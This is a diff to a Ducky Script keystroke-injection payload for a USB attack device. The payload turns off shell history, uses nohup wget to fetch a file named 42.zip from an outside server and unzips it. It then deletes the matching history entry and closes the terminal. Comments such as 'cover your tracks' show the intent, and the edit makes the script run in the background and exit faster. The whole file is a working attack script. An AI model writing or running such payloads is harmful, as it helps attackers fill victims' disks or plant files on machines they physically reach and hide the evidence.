@@ -16,15 +16,8 @@ STRING set +o history
 DELAY 300
 ENTER
 REM FIRE IN THE HOLE!
-STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null  &&  unzip 42.zip >/dev/null && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line
-DELAY 300
+STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null  &&  unzip 42.zip >/dev/null && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+DELAY 500
 ENTER
-DELAY 1500
-CTRL C
-DELAY 300
-CTRL C
-DELAY 300
-REM sneak +1 cover your tracks
-STRING set -o history && exit
-DELAY 200
-ENTER
+DELAY 500
+ALT F4
